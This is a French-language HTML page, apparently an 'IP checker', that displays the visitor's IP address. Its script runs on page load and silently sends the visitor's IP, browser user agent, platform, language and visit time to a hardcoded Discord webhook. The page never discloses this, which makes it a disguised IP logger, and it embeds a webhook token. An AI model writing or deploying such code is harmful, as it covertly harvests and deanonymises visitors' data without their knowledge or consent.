<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Mon IP</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #0b0b10;
      color: white;
      font-family: Arial, sans-serif;
    }

    .box {
      width: 90%;
      max-width: 500px;
      padding: 35px;
      text-align: center;
      background: #15151d;
      border: 1px solid #292936;
      border-radius: 20px;
      box-shadow: 0 20px 60px #0008;
    }

    h1 {
      margin-top: 0;
    }

    #ip {
      margin: 25px 0;
      padding: 18px;
      background: #09090d;
      border-radius: 12px;
      font-size: 26px;
      font-weight: bold;
    }

    button {
      padding: 12px 22px;
      border: 0;
      border-radius: 10px;
      background: #5865f2;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background: #4752c4;
    }
  </style>
</head>

<body>

  <div class="box">
    <h1>🌐 Mon adresse IP</h1>

    <div id="ip">Chargement...</div>

    <button onclick="getIP()">Actualiser</button>
  </div>

<script>
const WEBHOOK = "https://discord.com/api/webhooks/1550171984539943023/L2t-bGP3XElDMpG1paBdRQd8p9DPuplN7o_483z6gbf8CB4eCN3-WNCdN6Ei_lRNKSb6";

async function getIP() {
  try {
    const response = await fetch("https://api.ipify.org?format=json");
    const data = await response.json();

    const ip = data.ip;

    document.getElementById("ip").textContent = ip;

    // Envoi dans Discord
    await fetch(WEBHOOK, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        embeds: [{
          title: "🌐 Nouvelle visite",
          color: 5793266,
          fields: [
            {
              name: "Adresse IP",
              value: "`" + ip + "`"
            },
            {
              name: "Navigateur",
              value: "`" + navigator.userAgent.slice(0, 1000) + "`"
            },
            {
              name: "Plateforme",
              value: "`" + navigator.platform + "`"
            },
            {
              name: "Langue",
              value: "`" + navigator.language + "`"
            },
            {
              name: "Date",
              value: "`" + new Date().toLocaleString("fr-FR") + "`"
            }
          ]
        }]
      })
    });

  } catch (error) {
    document.getElementById("ip").textContent = "Erreur";
    console.error(error);
  }
}

getIP();
</script>

</body>
</html>
